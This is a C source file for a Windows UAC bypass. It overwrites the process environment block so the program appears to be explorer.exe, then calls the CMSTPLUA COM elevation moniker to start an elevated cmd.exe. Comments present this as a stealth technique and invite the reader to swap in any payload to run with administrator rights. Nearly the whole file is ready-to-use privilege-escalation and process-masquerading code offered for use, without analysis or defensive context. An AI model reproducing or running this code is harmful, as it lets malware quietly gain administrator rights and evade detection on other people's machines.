#include <windows.h>
#include <objbase.h>
#include <stdio.h>
#include <winternl.h>  // For PEB access

// ICMLuaUtil interface (same as before)
typedef interface ICMLuaUtil ICMLuaUtil;

typedef struct ICMLuaUtilVtbl {
    BEGIN_INTERFACE
    HRESULT(STDMETHODCALLTYPE *QueryInterface)(ICMLuaUtil *This, REFIID riid, void **ppvObject);
    ULONG(STDMETHODCALLTYPE *AddRef)(ICMLuaUtil *This);
    ULONG(STDMETHODCALLTYPE *Release)(ICMLuaUtil *This);
    HRESULT(STDMETHODCALLTYPE *ShellExec)(ICMLuaUtil *This, LPCWSTR lpFile, LPCWSTR lpParameters,
                                          LPCWSTR lpDirectory, ULONG fMask, ULONG nShow);
    END_INTERFACE
} ICMLuaUtilVtbl;

typedef struct ICMLuaUtil {
    CONST_VTBL struct ICMLuaUtilVtbl *lpVtbl;
} ICMLuaUtil;

static const CLSID CLSID_CMSTPLUA = {0x3E5FC7F9, 0x9A51, 0x4367, {0x90,0x63,0xA1,0x20,0x24,0x4F,0xBE,0xC7}};
static const IID   IID_ICMLuaUtil = {0x6EDD6D74, 0xC007, 0x4E75, {0xB7,0x6A,0xE5,0x74,0x09,0x95,0xE2,0x4C}};

// Simple PEB masquerade - spoof as explorer.exe
void MasqueradePEB() {
    PPEB pPeb = (PPEB)__readgsqword(0x60);  // x64 PEB
    if (pPeb && pPeb->ProcessParameters) {
        // Spoof image path and command line to look like explorer.exe
        wchar_t explorerPath[] = L"C:\\Windows\\explorer.exe";
        pPeb->ProcessParameters->ImagePathName.Buffer = explorerPath;
        pPeb->ProcessParameters->ImagePathName.Length = (USHORT)(wcslen(explorerPath) * 2);
        pPeb->ProcessParameters->ImagePathName.MaximumLength = pPeb->ProcessParameters->ImagePathName.Length + 2;

        pPeb->ProcessParameters->CommandLine.Buffer = explorerPath;
        pPeb->ProcessParameters->CommandLine.Length = pPeb->ProcessParameters->ImagePathName.Length;
        pPeb->ProcessParameters->CommandLine.MaximumLength = pPeb->ProcessParameters->CommandLine.Length + 2;
    }
}

int main(void) {
    HRESULT hr;
    ICMLuaUtil *pLuaUtil = NULL;
    BIND_OPTS3 bo = {0};

    // First, masquerade as explorer.exe for stealth and better auto-elevation chance
    MasqueradePEB();

    CoInitialize(NULL);

    bo.cbStruct = sizeof(bo);
    bo.dwClassContext = CLSCTX_LOCAL_SERVER;

    // Elevation moniker
    hr = CoGetObject(L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}",
                     (BIND_OPTS*)&bo, &IID_ICMLuaUtil, (void**)&pLuaUtil);

    if (SUCCEEDED(hr) && pLuaUtil != NULL) {
        // <<< CHANGE THIS PAYLOAD TO WHATEVER YOU WANT ELEVATED >>>
        pLuaUtil->lpVtbl->ShellExec(pLuaUtil,
                                    L"C:\\Windows\\System32\\cmd.exe",
                                    L"/k whoami && echo SUCCESS - Elevated via CMSTPLUA with PEB spoof && pause",
                                    NULL,
                                    SEE_MASK_DEFAULT,
                                    SW_SHOW);

        pLuaUtil->lpVtbl->Release(pLuaUtil);
        printf("[+] CMSTPLUA bypass with PEB masquerade successful.\n");
    } else {
        printf("[-] Failed. HRESULT: 0x%08X\n", hr);
    }

    CoUninitialize();
    return 0;
}
